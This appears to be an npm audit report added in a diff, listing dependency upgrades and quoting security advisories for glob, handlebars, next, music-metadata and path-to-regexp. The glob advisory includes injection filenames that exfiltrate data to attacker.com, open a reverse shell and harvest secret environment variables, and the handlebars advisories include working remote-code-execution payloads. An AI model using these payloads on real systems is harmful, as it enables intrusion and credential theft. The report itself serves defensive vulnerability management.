@@ -1,0 +1,907 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115538,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115539,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115544,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115588,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115589,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115692,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115693,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115694,
+          "path": "services__gateway-api>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "handlebars",
+      "target": "4.7.9",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115541,
+          "path": "apps__trading-ui>eslint-config-next>@next/eslint-plugin-next>glob>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "2.1.0",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115573,
+          "path": "services__adapter-slack>@slack/bolt>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115582,
+          "path": "services__adapter-slack>@slack/bolt>path-to-regexp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "path-to-regexp",
+      "target": "8.4.2",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115997,
+          "path": ".>@expo/config>@expo/config-plugins>@expo/plist>@xmldom/xmldom",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "@xmldom/xmldom",
+      "target": "0.8.13",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116560,
+          "path": "services__adapter-slack>@slack/bolt>axios>follow-redirects",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "follow-redirects",
+      "target": "1.16.0",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116673,
+          "path": "services__adapter-slack>@slack/bolt>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116675,
+          "path": "services__adapter-slack>@slack/bolt>axios",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "axios",
+      "target": "1.15.1",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "prismjs",
+      "resolves": [
+        {
+          "id": 1105770,
+          "path": "apps__canvas-ui>react-syntax-highlighter>refractor>prismjs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109842,
+          "path": "apps__trading-ui>eslint-config-next>@next/eslint-plugin-next>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "next",
+      "resolves": [
+        {
+          "id": 1112593,
+          "path": "apps__trading-ui>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112653,
+          "path": "apps__trading-ui>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114897,
+          "path": "apps__trading-ui>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114940,
+          "path": "apps__trading-ui>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116376,
+          "path": "apps__trading-ui>next",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "file-type",
+      "resolves": [
+        {
+          "id": 1114301,
+          "path": "services__adapter-whatsapp-personal>@whiskeysockets/baileys>music-metadata>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "music-metadata",
+      "resolves": [
+        {
+          "id": 1114969,
+          "path": "services__adapter-whatsapp-personal>@whiskeysockets/baileys>music-metadata",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "brace-expansion",
+      "resolves": [
+        {
+          "id": 1115540,
+          "path": ".>eslint>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "lodash",
+      "resolves": [
+        {
+          "id": 1115806,
+          "path": ".>commitlint>@commitlint/cli>@commitlint/read>git-raw-commits>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115810,
+          "path": ".>commitlint>@commitlint/cli>@commitlint/read>git-raw-commits>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "fastify",
+      "resolves": [
+        {
+          "id": 1116644,
+          "path": "services__gateway-api>fastify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@fastify/static",
+      "resolves": [
+        {
+          "id": 1116758,
+          "path": "services__piper>@fastify/static",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116759,
+          "path": "services__piper>@fastify/static",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "protobufjs",
+      "resolves": [
+        {
+          "id": 1116832,
+          "path": "services__adapter-whatsapp-personal>@whiskeysockets/baileys>@whiskeysockets/libsignal-node>protobufjs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116832,
+          "path": "services__adapter-whatsapp-personal>@whiskeysockets/baileys>protobufjs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.3.10",
+          "paths": [
+            "apps__trading-ui>eslint-config-next>@next/eslint-plugin-next>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=10.2.0 <10.5.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 10.5.0 or later",
+      "patched_versions": ">=10.5.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1112653": {
+      "findings": [
+        {
+          "version": "14.2.35",
+          "paths": [
+            "apps__trading-ui>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112653,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.0.8",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 15.0.8 or later",
+      "patched_versions": ">=15.0.8",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1114969": {
+      "findings": [
+        {
+          "version": "7.14.0",
+          "paths": [
+            "services__adapter-whatsapp-personal>@whiskeysockets/baileys>music-metadata"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/Borewit/music-metadata/security/advisories/GHSA-v6c2-xwv6-8xf7\n- https://github.com/Borewit/music-metadata/releases/tag/v11.12.3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32256\n- https://github.com/advisories/GHSA-v6c2-xwv6-8xf7",
+      "created": "2026-03-17T20:04:48.000Z",
+      "id": 1114969,
+      "npm_advisory_id": null,
+      "overview": "# Summary\n\nmusic-metadata's ASF parser (`parseExtensionObject()` in `lib/asf/AsfParser.ts:112-158`) enters an infinite loop when a sub-object inside the ASF Header Extension Object has `objectSize = 0`.\n\n## Root Cause\n\nWhen objectSize is 0:\n1. `remaining = 0 - 24 = -24`\n2. `tokenizer.ignore(-24)` moves the read position backward by 24 bytes\n3. `extensionSize -= 0` (loop counter never decreases)\n4. `while (extensionSize > 0)` never exits\n5. The same 24-byte header is re-read infinitely\n\nThis is the same pattern as CVE-2026-31808 (GHSA-5v7r-6r5c-r473) in file-type — strtok3's `AbstractTokenizer.ignore()` accepts negative values without validation.\n\n## Affected Methods\n- `parseFile()` — HANGS (FileTokenizer inherits vulnerable ignore())\n- `parseBuffer()` — HANGS (BufferTokenizer inherits vulnerable ignore())\n- `parseStream()` — NOT affected (ReadStreamTokenizer has own ignore() that throws RangeError)\n\n## Impact\nA 100-byte crafted .asf file permanently hangs any application using parseFile() or parseBuffer(). music-metadata has 2.2M weekly npm downloads.\n\n## Suggested Fix\nValidate `objectSize >= minimumHeaderSize` before calculating the payload. Or fix strtok3's `AbstractTokenizer.ignore()` to reject negative values.",
+      "reported_by": null,
+      "title": "music-metadata has an infinite loop vulnerability in ASF parser",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32256"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "music-metadata",
+      "vulnerable_versions": "<=11.12.1",
+      "github_advisory_id": "GHSA-v6c2-xwv6-8xf7",
+      "recommendation": "Upgrade to version 11.12.3 or later",
+      "patched_versions": ">=11.12.3",
+      "updated": "2026-03-19T21:00:51.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-v6c2-xwv6-8xf7"
+    },
+    "1115538": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            "services__gateway-api>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-3mfm-83xf-c92r\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33938\n- https://github.com/advisories/GHSA-3mfm-83xf-c92r",
+      "created": "2026-03-27T18:20:44.000Z",
+      "id": 1115538,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.\n\n## Proof of Concept\n\nTested with Handlebars 4.7.8 and `handlebars-helpers`:\n\n```javascript\nconst Handlebars = require('handlebars');\nconst merge = require('handlebars-helpers').object().merge;\nHandlebars.registerHelper('merge', merge);\n\nconst vulnerableTemplate = `\n{{#*inline \"myPartial\"}}\n    {{>@partial-block}}\n    {{>@partial-block}}\n{{/inline}}\n{{#>myPartial}}\n    {{merge @_parent partial-block=1}}\n    {{merge @_parent partial-block=payload}}\n{{/myPartial}}\n`;\n\nconst maliciousContext = {\n  payload: {\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Code injected via depth field — breaks out of generated function call\n          depth: \"0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: RCE via @partial-block\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.\n- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.\n- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion by tampering @partial-block",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33938"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-3mfm-83xf-c92r",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:26.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-3mfm-83xf-c92r"
+    },
+    "1115539": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            "services__gateway-api>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2w6w-674q-4c4q\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33937\n- https://github.com/advisories/GHSA-2w6w-674q-4c4q",
+      "created": "2026-03-27T18:19:58.000Z",
+      "id": 1115539,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33937"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-2w6w-674q-4c4q",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:19.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-2w6w-674q-4c4q"
+    },
+    "1115573": {
+      "findings": [
+        {
+          "version": "8.3.0",
+          "paths": [
+            "services__adapter-slack>@slack/bolt>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-j3q9-mxjg-w52f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4926\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-j3q9-mxjg-w52f",
+      "created": "2026-03-27T22:23:27.000Z",
+      "id": 1115573,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.\n\n### Patches\n\nFixed in version 8.4.0.\n\n### Workarounds\n\nLimit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.",
+      "reported_by": null,
+      "title": "path-to-regexp vulnerable to Denial of Service via sequential optional groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4926"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=8.0.0 <8.4.0",
+      "github_advisory_id": "GHSA-j3q9-mxjg-w52f",
+      "recommendation": "Upgrade to version 8.4.0 or later",
+      "patched_versions": ">=8.4.0",
+      "updated": "2026-03-27T22:23:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-j3q9-mxjg-w52f"
+    },
+    "1115692": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            "services__gateway-api>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xjpj-3mr7-gcpf\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33941\n- https://github.com/advisories/GHSA-xjpj-3mr7-gcpf",
+      "created": "2026-03-27T18:22:10.000Z",
+      "id": 1115692,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` / `--commonjs`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` / `--handlebarPath`)\n\n```javascript\n// Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); //.handlebars\"\n\nnode bin/handlebars templates -o out.js\nnode -e 'require(\"./out.js\")'  # Executes injected code, creates ./pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); //\"\nnode -e 'require(\"./out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); //'\nnode -e 'require(\"./out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin/handlebars templates -o out.js -a \\\n  -h \"'); 